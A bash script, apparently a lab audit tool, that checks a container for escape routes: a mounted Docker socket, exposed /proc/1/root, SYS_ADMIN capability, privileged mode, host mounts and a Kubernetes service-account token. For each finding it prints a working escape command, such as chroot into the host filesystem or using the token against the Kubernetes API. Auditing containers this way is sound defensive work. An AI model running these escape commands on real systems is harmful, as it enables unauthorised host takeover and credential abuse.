#!/bin/bash

echo "==== Container Escape Safety Check (Lab Only) ===="
apk add jq

function suggest_exploit() {
  local reason=$1
  local command=$2

  echo -e "\n[⚠️  Escape Path Detected: $reason]"
  echo -e "[💡 Suggested Command for Lab Use Only]"
  echo -e "    $command"
}

function check_path() {
  local path=$1
  local explanation=$2
  if [ -e "$path" ]; then
    echo "[!] Found: $path - $explanation"
    return 0
  else
    echo "[+] Not found: $path - Safe"
    return 1
  fi
}

function check_docker_socket() {
  echo "[*] Checking Docker socket..."
  if [ -S /var/run/docker.sock ]; then
    echo "[!] Docker socket is mounted inside the container"
    suggest_exploit "Docker socket exposure" \
      "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"
  else
    echo "[+] Docker socket not found - Safe"
  fi
}

function check_host_proc_access() {
  if check_path "/proc/1/root" "Can allow access to host filesystem if not namespaced"; then
    suggest_exploit "/proc/1/root exposed" \
      "chroot /proc/1/root /bin/sh"
  fi
}

function check_cap_sys_admin() {
  echo "[*] Checking capabilities..."
  if capsh --print | grep -qE "cap_sys_admin|cap_sys_ptrace"; then
    echo "[!] Container has SYS_ADMIN or PTRACE - Dangerous capabilities available"
    suggest_exploit "SYS_ADMIN + mounted host path" \
      "mount -t proc proc /host/proc && chroot /host sh"
  else
    echo "[+] SYS_ADMIN and PTRACE not found - Safe"
  fi
}

function check_privileged_mode() {
  echo "[*] Checking for privileged mode..."
  if grep -q 'CapEff: ffffffff' /proc/self/status; then
    echo "[!] Container likely running in privileged mode"
    suggest_exploit "Privileged container" \
      "mkdir /tmp/host; mount /dev/sda1 /tmp/host && chroot /tmp/host"
  else
    echo "[+] Container is not in full privileged mode"
  fi
}

function check_host_mount() {
  if mount | grep -q '/host'; then
    echo "[!] Host filesystem appears mounted under /host"
    suggest_exploit "Host mount detected" \
      "chroot /host /bin/bash"
  fi
}

function check_k8s_token() {
  if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
    echo "[!] Kubernetes service token found"
    suggest_exploit "K8s API abuse via service token" \
      "curl -s --header \"Authorization: Bearer \$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default"
  else
    echo "[+] No K8s service account token found"
  fi
}

echo ""
check_path "/dev/mem" "Can lead to host memory read/write if privileged"
check_host_proc_access
check_host_mount
check_cap_sys_admin
check_privileged_mode
check_docker_socket
check_k8s_token

echo ""
echo "==== Check Complete. Use responsibly in lab environments only. ===="
